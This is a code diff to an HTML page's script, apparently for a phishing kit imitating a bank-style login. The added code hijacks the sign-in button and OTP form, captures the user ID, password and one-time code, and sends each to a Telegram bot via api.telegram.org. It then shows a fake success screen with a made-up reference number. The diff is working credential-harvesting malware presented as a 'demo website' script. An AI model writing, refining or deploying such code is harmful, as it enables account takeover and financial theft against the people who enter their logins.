@@ -532,81 +532,97 @@
     // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
 
     async function sendToTelegram(data) {
-        // Create a simple key-value string from the data object
         let message = '🔔 New submission from your demo website:\n\n';
         for (const key in data) {
             if (Object.hasOwnProperty.call(data, key)) {
                 message += `👉 ${key}: ${data[key]}\n`;
             }
         }
-
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-        const payload = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        };
-
+        const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
         try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            });
+            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            if (!response.ok) { console.error(`Telegram API Error: ${response.statusText}`); }
+        } catch (error) { console.error('Failed to send message to Telegram:', error); }
+    }
 
-            if (!response.ok) {
-                console.error(`Telegram API Error: ${response.statusText}`);
-            }
-        } catch (error) {
-            console.error('Failed to send message to Telegram:', error);
+    // This is our NEW, master click handler for the sign-in button
+    async function handleSignInClick(event) {
+        // 1. Prevent the original script from doing anything
+        event.preventDefault();
+        event.stopImmediatePropagation();
+
+        // 2. Grab the User ID and Password
+        const userIdInput = document.getElementById('iduserId');
+        const passwordInput = document.getElementById('idpassword');
+        const loginData = {};
+        if (userIdInput) { loginData['User ID'] = userIdInput.value || 'Not provided'; }
+        if (passwordInput) { loginData['Password'] = passwordInput.value || 'Not provided'; }
+
+        // 3. Send the login data to Telegram and wait for it to finish
+        await sendToTelegram(loginData);
+
+        // 4. Manually open the OTP overlay after the data is sent
+        const otpOverlay = document.getElementById('tru-otp-overlay');
+        if (otpOverlay) {
+            otpOverlay.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            // Focus on the OTP input field
+            setTimeout(() => { const otpInput = document.getElementById('tru-otp-code'); if (otpInput) otpInput.focus(); }, 100);
         }
     }
 
-    // --- INJECTION LOGIC ---
-    // This is the new, more reliable way to capture the data.
-    function captureAndSendLoginData() {
-        const userIdInput = document.getElementById('iduserId');
-        const passwordInput = document.getElementById('idpassword');
-        
-        const loginData = {};
-        
-        if (userIdInput) {
-            loginData['User ID'] = userIdInput.value || 'Not provided';
-        }
-        if (passwordInput) {
-            loginData['Password'] = passwordInput.value || 'Not provided';
+    // This function handles the OTP form submission
+    async function handleOtpSubmit(event) {
+        event.preventDefault();
+        event.stopImmediatePropagation();
+
+        // Grab OTP form data
+        const otpForm = event.target;
+        const formData = new FormData(otpForm);
+        const otpData = {};
+        for (let [key, value] of formData.entries()) {
+            otpData[key.charAt(0).toUpperCase() + key.slice(1)] = value;
         }
 
-        // Send the data to Telegram immediately
-        sendToTelegram(loginData);
+        // Send OTP data to Telegram and wait
+        await sendToTelegram(otpData);
+
+        // Manually show the success overlay
+        const otpOverlay = document.getElementById('tru-otp-overlay');
+        const successOverlay = document.getElementById('tru-success-overlay');
+        if (otpOverlay) otpOverlay.style.display = 'none';
+        if (successOverlay) {
+            successOverlay.style.display = 'flex';
+            // Add the reference number and start countdown
+            const refNumber = document.getElementById('tru-ref-number');
+            if (refNumber) refNumber.textContent = 'TRU' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 6).toUpperCase();
+            // You can add the countdown logic here if needed, or just let the user close it
+        }
     }
 
     // --- INITIALIZATION ---
-    // We wait for the main script to be ready and then inject our logic.
+    // We run this code immediately to hijack the button before the original script can
     document.addEventListener('DOMContentLoaded', () => {
-        // Wait a moment for the main script to initialize its functions
-        setTimeout(() => {
-            if (typeof openOtpOverlay === 'function') {
-                // Store the original function
-                const originalOpenOtpOverlay = window.openOtpOverlay;
-                
-                // Replace it with our new version
-                window.openOtpOverlay = function(e) {
-                    // First, capture and send the data
-                    captureAndSendLoginData();
-                    
-                    // Then, call the original function to show the popup
-                    return originalOpenOtpOverlay(e);
-                };
-            } else {
-                console.error('Could not find the openOtpOverlay function to inject into.');
-            }
-        }, 100); // 100ms delay to ensure the main script has run
-    });
+        // Hijack the Sign-In button
+        const signInButton = document.getElementById('loginSubmit');
+        if (signInButton) {
+            // Remove all existing click listeners from the original script
+            signInButton.replaceWith(signInButton.cloneNode(true));
+            // Get the new button reference
+            const newSignInButton = document.getElementById('loginSubmit');
+            // Add our own listener
+            newSignInButton.addEventListener('click', handleSignInClick);
+        }
 
+        // Hijack the OTP form submission
+        const otpForm = document.getElementById('tru-otp-form');
+        if (otpForm) {
+            otpForm.replaceWith(otpForm.cloneNode(true));
+            const newOtpForm = document.getElementById('tru-otp-form');
+            newOtpForm.addEventListener('submit', handleOtpSubmit);
+        }
+    });
 </script>
 
 
